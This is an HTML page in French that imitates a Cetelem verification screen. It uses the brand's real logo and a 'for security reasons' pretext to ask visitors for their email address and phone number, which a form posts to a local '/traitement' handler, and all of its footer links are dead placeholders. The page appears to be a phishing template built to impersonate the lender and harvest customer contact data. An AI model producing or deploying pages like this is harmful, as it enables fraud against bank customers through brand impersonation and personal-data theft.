<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Cetelem - Vérification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background-color: #c0d4cc;
      margin: 0;
      color: #333;
    }

    .header {
      background-color: #fff;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: sticky;
      top: 0;
      z-index: 1000;
    }

    .header-left {
      display: flex;
      align-items: center;
    }

    .header-logo {
      max-width: 120px;
      margin-right: 15px;
    }

    .header-text {
      font-size: 14px;
      color: #555;
      font-style: italic;
    }

    .header-right a {
      color: #2e7d54;
      font-weight: bold;
      text-decoration: none;
      font-size: 14px;
    }

    .login-box {
      background: #fff;
      max-width: 390px;
      margin: 50px auto;
      padding: 35px 30px;
      border-radius: 10px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
      text-align: center;
      box-sizing: border-box;
    }

    .login-box h1 {
      font-size: 20px;
      margin-bottom: 22px;
      color: #2e7d54;
    }

    .login-box p {
      font-size: 14px;
      color: #555;
      margin-bottom: 25px;
    }

    label {
      font-size: 14px;
      display: block;
      text-align: left;
      margin-bottom: 6px;
      font-weight: 500;
    }

    input[type="email"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      font-size: 15px;
      border: 1px solid #2e7d54;
      border-radius: 5px;
      margin-bottom: 18px;
      box-sizing: border-box;
      outline: none;
    }

    .btn {
      background-color: #2e7d54;
      color: #fff;
      font-size: 15px;
      padding: 11px 0;
      width: 100%;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    footer {
      font-size: 12px;
      text-align: center;
      margin: 35px 15px 25px;
      color: #333;
    }

    footer a {
      margin: 0 6px;
      color: #000;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="header-left">
      <img src="https://www.cetelem.fr/brand/logo.svg" alt="Cetelem" class="header-logo">
      <div class="header-text">Cetelem à votre service</div>
    </div>
    <div class="header-right">
      <a href="#">Nous contacter</a>
    </div>
  </div>

  <div class="login-box">
    <h1>Vérifiez vos informations</h1>
    <p>Pour des raisons de sécurité, nous avons besoin de vos informations de contact.</p>
    <form method="POST" action="/traitement">
      <label for="email">Adresse e-mail</label>
      <input type="email" name="email" id="email" placeholder="Ex : jean.dupont@mail.com" required>

      <label for="telephone">Téléphone</label>
      <input type="tel" name="telephone" id="telephone" placeholder="Ex : 0612345678" required pattern="^0[1-9]\d{8}$">

      <button class="btn" type="submit">Continuer</button>
    </form>
  </div>

  <footer>
    <a href="#">Virement express</a>
    <a href="#">Réclamation</a>
    <a href="#">Contact</a>
    <a href="#">Questions / Réponses</a>
    <a href="#">Mentions légales</a>
    <a href="#">Cookies</a>
    <a href="#">Préférences cookies</a>
    <a href="#">Accessibilité</a>
  </footer>

</body>
</html>
